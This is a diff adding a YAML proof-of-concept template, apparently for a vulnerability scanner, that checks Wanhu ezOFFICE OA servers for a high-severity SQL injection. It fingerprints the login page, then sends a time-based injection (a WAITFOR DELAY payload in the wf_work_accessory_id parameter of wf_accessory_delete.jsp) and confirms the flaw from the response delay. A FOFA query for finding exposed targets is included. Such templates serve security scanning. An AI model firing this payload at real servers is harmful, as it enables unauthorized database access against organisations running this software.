@@ -1,0 +1,34 @@
+id: poc-yaml-wanhu-oa-wfaccessory-delete-jsp-sqli
+info:
+  name: 万户Ezoffice wf_accessory_delete.jsp SQL注入
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 1
+requests:
+- method: GET
+  path: /defaultroot/login.jsp
+  expression: 'status_code == 200 &&
+
+    contains(body,`whirRootPath = "/defaultroot"`) &&
+
+    contains(body,"login.jsp")
+
+    '
+- method: GET
+  path: /defaultroot/platform/bpm/work_flow/operate/wf_accessory_delete.jsp;?wf_work_accessory_id=1%3BWAITFOR+DELAY+%270%3A0%3A{{.t1}}%27--
+  expression: 'status_code == 200 &&
+
+    contains(headers,"text/html") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
